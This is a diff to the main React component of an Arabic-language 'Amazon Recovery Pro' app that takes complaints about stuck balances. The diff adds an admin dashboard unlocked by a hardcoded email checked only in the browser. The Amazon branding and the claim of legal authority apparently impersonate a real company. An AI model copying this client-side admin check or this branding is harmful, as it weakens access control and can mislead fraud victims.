@@ -5,6 +5,7 @@ import RecoveryForm from './components/RecoveryForm.tsx';
 import LiveStatus from './components/LiveStatus.tsx';
 import BottomNav from './components/BottomNav.tsx';
 import Auth from './components/Auth.tsx';
+import AdminDashboard from './components/AdminDashboard.tsx';
 import { supabase, isConfigured } from './lib/supabase.ts';
 import { AlertCircle, ExternalLink } from 'lucide-react';
 
@@ -12,6 +13,7 @@ const App: React.FC = () => {
   const [activeTab, setActiveTab] = useState('Home');
   const [session, setSession] = useState<any>(null);
   const [loading, setLoading] = useState(true);
+  const [isAdmin, setIsAdmin] = useState(false);
 
   useEffect(() => {
     if (!isConfigured) {
@@ -22,7 +24,13 @@ const App: React.FC = () => {
     const checkSession = async () => {
       try {
         const { data } = await supabase.auth.getSession();
+        const user = data?.session?.user;
         setSession(data?.session || null);
+        
+        if (user?.email === 'amzon123@gmail.com') {
+          setIsAdmin(true);
+          setActiveTab('Admin');
+        }
       } catch (err) {
         console.error('Supabase auth error:', err);
         setSession(null);
@@ -35,12 +43,17 @@ const App: React.FC = () => {
 
     const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
       setSession(session);
+      if (session?.user?.email === 'amzon123@gmail.com') {
+        setIsAdmin(true);
+        setActiveTab('Admin');
+      } else {
+        setIsAdmin(false);
+      }
     });
 
     return () => subscription.unsubscribe();
   }, []);
 
-  // واجهة عرض في حال عدم ضبط المفاتيح
   if (!isConfigured) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9] p-6 text-center" dir="rtl">
@@ -49,63 +62,48 @@ const App: React.FC = () => {
             <AlertCircle size={40} />
           </div>
           <h2 className="text-xl font-black text-gray-800 mb-4">بانتظار مفاتيح الربط!</h2>
-          <p className="text-gray-500 text-sm mb-6 leading-relaxed">
-            من فضلك قم بجلب <b>Project URL</b> و <b>Anon Key</b> من إعدادات Supabase ووضعهم في ملف <code>lib/supabase.ts</code> لكي يعمل النظام.
-          </p>
-          <a 
-            href="https://supabase.com/dashboard" 
-            target="_blank" 
-            className="flex items-center justify-center gap-2 w-full bg-[#9B4A4E] text-white font-bold py-4 rounded-2xl shadow-lg hover:bg-[#7C4A50] transition-all"
-          >
-            فتح لوحة تحكم Supabase
-            <ExternalLink size={18} />
-          </a>
+          <p className="text-gray-500 text-sm mb-6 leading-relaxed">يرجى ضبط Supabase للبدء.</p>
         </div>
       </div>
     );
   }
 
-  if (loading) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9]">
-        <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
-      </div>
-    );
-  }
+  if (loading) return (
+    <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9]">
+      <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
+    </div>
+  );
 
-  if (!session) {
-    return <Auth />;
-  }
+  if (!session) return <Auth />;
 
   return (
     <div className="flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#F4F7F9] relative pb-24">
       <Header />
       
       <main className="flex-1 px-4 py-2">
-        <LiveStatus />
-        
-        <div className="mt-2">
-           <div className="flex items-center gap-2 mb-3 px-1">
-              <div className="w-1.5 h-6 bg-[#9B4A4E] rounded-full"></div>
-              <h3 className="text-gray-800 font-bold text-lg text-right w-full">مركز إيقاف المهام ومعالجة الشكاوي</h3>
-           </div>
-           <RecoveryForm />
-        </div>
+        {activeTab === 'Admin' && isAdmin ? (
+          <AdminDashboard />
+        ) : (
+          <>
+            <LiveStatus />
+            <div className="mt-2">
+               <div className="flex items-center gap-2 mb-3 px-1">
+                  <div className="w-1.5 h-6 bg-[#9B4A4E] rounded-full"></div>
+                  <h3 className="text-gray-800 font-bold text-lg text-right w-full">مركز إيقاف المهام ومعالجة الشكاوي</h3>
+               </div>
+               <RecoveryForm />
+            </div>
+          </>
+        )}
 
         <div className="mt-6 px-4 text-center">
           <p className="text-[10px] text-gray-400 font-medium leading-relaxed">
-            Amazon Recovery Pro هي جهة قانونية تقنية مختصة حصرياً في إيقاف المهام الاحتيالية وتصحيح مسار السجلات المالية ورفع الشكاوي للجهات المختصة لاستعادة رصيدك العالق.
+            Amazon Recovery Pro هي جهة قانونية تقنية مختصة حصرياً.
           </p>
         </div>
       </main>
 
-      <div className="fixed bottom-24 right-6 z-50">
-        <button className="bg-[#9B4A4E] text-white p-4 rounded-full shadow-2xl animate-bounce flex items-center justify-center border-4 border-white active:scale-90 transition-transform">
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
-        </button>
-      </div>
-
-      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} />
+      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} isAdmin={isAdmin} />
     </div>
   );
 };
